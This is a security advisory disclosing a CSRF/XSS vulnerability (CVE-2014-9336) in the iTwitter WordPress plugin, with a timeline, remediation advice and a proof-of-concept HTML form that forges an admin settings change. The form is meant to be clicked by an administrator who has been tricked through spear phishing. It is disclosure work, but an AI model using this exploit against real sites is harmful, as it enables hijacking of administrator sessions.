# Title: CSRF/XSS Vulnerability in iTwitter WP Plugin 
# Author: Manideep K	
# CVE-ID: CVE-2014-9336
# Plugin Homepage: https://wordpress.org/plugins/itwitter/
# Version Affected: 0.04 (probably lower versions)
# Severity: High 

# Description: 
# Vulnerable Parameter: itex_t_twitter_username, itex_t_twitter_userpass etc
# About Vulnerability: This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin’s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 
# Vulnerability Class:   	
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29	        
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) 

# Steps to Reproduce: (POC):
After installing the plugin

You can use the following exploit code to exploit the vulnerability. For testing - you can just save it as .html and then get it clicked with an logged in administrator (by social engineering/spear phishing techniques) and see exploit in action
Almost majority of the fields are vulnerable to CSRF + XSS attack

<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=iTwitter.php" method="POST">
      <input type="hidden" name="itex&#95;t&#95;twitter&#95;username" value="csrf testing" />
      <input type="hidden" name="itex&#95;t&#95;twitter&#95;userpass" value="" />
      <input type="hidden" name="itex&#95;t&#95;cache&#95;enable" value="0" />
      <input type="hidden" name="itex&#95;t&#95;cache&#95;time" value="3600" />
      <input type="hidden" name="itex&#95;t&#95;cache&#95;where" value="0" />
      <input type="hidden" name="itex&#95;t&#95;cache&#95;file" value="C&#58;&#92;wamp&#92;www&#92;wordpress&#92;wp&#45;content&#92;plugins&#92;itwitter&#92;iTwitterCacheFile&#46;txt" />
      <input type="hidden" name="global&#95;debugenable" value="0" />
      <input type="hidden" name="global&#95;debugenable&#95;forall" value="0" />
      <input type="hidden" name="global&#95;widget" value="0" />
      <input type="hidden" name="global&#95;collapse" value="1" />
      <input type="hidden" name="itex&#95;t&#95;shorturls&#95;service" value="random" />
      <input type="hidden" name="itex&#95;t&#95;post2twitter&#95;enable" value="0" />
      <input type="hidden" name="itex&#95;t&#95;post2twitter&#95;template" value="&#37;title&#37;&#32;&#37;excerpt&#37;&#32;&#37;url&#37;" />
      <input type="hidden" name="itex&#95;t&#95;replace&#95;links&#95;enable" value="0" />
      <input type="hidden" name="itex&#95;t&#95;last&#95;tweets&#95;enable" value="0" />
      <input type="hidden" name="itex&#95;t&#95;last&#95;tweets&#95;users" value="" />
      <input type="hidden" name="itex&#95;t&#95;last&#95;tweets&#95;pos" value="footer" />
      <input type="hidden" name="info&#95;update" value="Save&#32;Changes" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>



# Recommendations:
a) Use proper input filtering techniques
b) Use unique tokens such as nonces
 
# Mitigation: 
Plugin Closed

# Disclosure:
2014-11-06:  Author notification
2014-11-20:  WP Team action taken by closing the plugin as there is no response from author
2014-12-09: Public Disclosure

# Credits:
Manideep K
Information Security Researcher
https://in.linkedin.com/in/manideepk

